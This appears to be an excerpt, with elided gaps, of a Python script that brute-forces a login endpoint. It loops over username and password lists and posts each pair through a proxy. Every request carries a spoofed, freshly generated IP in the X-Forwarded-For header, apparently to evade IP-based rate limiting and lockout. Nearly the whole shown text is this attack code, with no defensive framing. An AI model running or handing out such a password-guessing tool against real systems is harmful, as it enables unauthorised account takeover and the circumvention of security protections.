...
request_count = 0
def make_request(uname, pword, ip_addy):
        payload = {"username": uname,
                   "password": pword}
        headers = {"X-Forwarded-For": ip_addy}
        r  = requests.post(HOST+ENDPOINT, proxies=proxies, data=payload, headers=headers)
...
parser.add_argument('--url', help="Full url for login endpoint")
...
if type(USERNAME) == str:
        if type(PASSWORD) == str:
                new_ip = make_ip()
                make_request(USERNAME, PASSWORD, new_ip)
        ...
        for user in USERNAME:
                if type(PASSWORD) == str:
                        new_ip = make_ip()
                        make_request(user, PASSWORD, new_ip)
                elif type(PASSWORD) == list:
                        for passw in PASSWORD:
                                new_ip = make_ip()
                                make_request(user, passw, new_ip)
